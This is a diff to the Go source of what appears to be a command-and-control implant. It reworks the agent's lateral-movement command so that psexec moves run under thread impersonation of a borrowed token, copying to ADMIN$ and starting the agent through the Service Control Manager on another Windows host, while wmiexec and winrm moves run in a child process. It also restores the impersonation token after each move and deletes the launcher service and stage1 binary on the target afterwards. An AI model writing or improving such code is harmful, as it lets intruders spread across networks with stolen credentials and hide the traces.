@@ -91,10 +91,16 @@ func parseLateralPayload(command string) (lateralPayload, error) {
 }
 
 // lateralCommand handles __LATERAL__: start a copy of this agent on another
-// host through the requested execution method. The work runs in a bounded
-// child process so the synchronous command loop is never blocked forever,
-// and so an active make_token identity — applied through applyCommandToken —
-// governs the SMB, SCM, WMI, and WinRM authentication of the move.
+// host through the requested execution method.
+//
+// psexec runs in a goroutine with a locked OS thread so thread impersonation
+// (ImpersonateLoggedOnUser) governs the ADMIN$ copy and SCM calls directly —
+// no child process, no SE_ASSIGNPRIMARYTOKEN_PRIVILEGE requirement.
+//
+// wmiexec and winrm still use a bounded child process (COM vtable and WSMan
+// API calls stay in the child). CreateProcessAsUserW may internally revert
+// the creating thread's impersonation, so reestablishThreadToken is called
+// after the child exits to restore the thread token if one was active.
 func lateralCommand(command string) (string, error) {
 	payload, err := parseLateralPayload(command)
 	if err != nil {
@@ -103,6 +109,19 @@ func lateralCommand(command string) (string, error) {
 	if runtime.GOOS != "windows" {
 		return "", errors.New("lateral movement requires the Windows agent build")
 	}
+	ctx, cancel := context.WithTimeout(agentContext, time.Duration(payload.TimeoutSeconds*float64(time.Second)))
+	defer cancel()
+
+	if payload.Method == "psexec" {
+		result, err := lateralPsexecGoroutine(ctx, payload)
+		if err != nil {
+			return "", err
+		}
+		rememberLateralCleanup(payload, result)
+		return result, nil
+	}
+
+	// wmiexec / winrm: child process with optional SysProcAttr.Token.
 	self, err := os.Executable()
 	if err != nil {
 		return "", fmt.Errorf("resolve agent executable: %w", err)
@@ -111,11 +130,12 @@ func lateralCommand(command string) (string, error) {
 	if err != nil {
 		return "", err
 	}
-	ctx, cancel := context.WithTimeout(agentContext, time.Duration(payload.TimeoutSeconds*float64(time.Second)))
-	defer cancel()
 	child := newBoundedCommand(ctx, self, "--lateral-child", string(encoded))
 	applyCommandToken(child)
 	out, err := child.CombinedOutput()
+	// CreateProcessAsUserW may have reverted the creating thread's impersonation;
+	// restore it before returning so subsequent commands stay authenticated.
+	reestablishThreadToken()
 	if ctx.Err() == context.DeadlineExceeded {
 		return "", errors.New("lateral move timed out; the target may still have started the agent")
 	}
@@ -199,7 +219,8 @@ func parseLateralCleanupPayload(command string) (lateralCleanupPayload, error) {
 // lateralCleanupCommand handles __LATERAL_CLEANUP__ after a psexec move: it
 // runs in a bounded child (with the active make_token identity through
 // applyCommandToken) that deletes the temporary launcher service and the
-// stage1 binary on the target once the agent is running.
+// stage1 binary on the target once the agent is running. reestablishThreadToken
+// is called after the child exits for the same reason as in lateralCommand.
 func lateralCleanupCommand(command string) (string, error) {
 	payload, err := parseLateralCleanupPayload(command)
 	if err != nil {
@@ -224,6 +245,7 @@ func lateralCleanupCommand(command string) (string, error) {
 	child := newBoundedCommand(ctx, self, "--lateral-cleanup-child", string(encoded))
 	applyCommandToken(child)
 	out, err := child.CombinedOutput()
+	reestablishThreadToken()
 	if err != nil {
 		if message := strings.TrimSpace(string(out)); message != "" {
 			return "", errors.New(message)
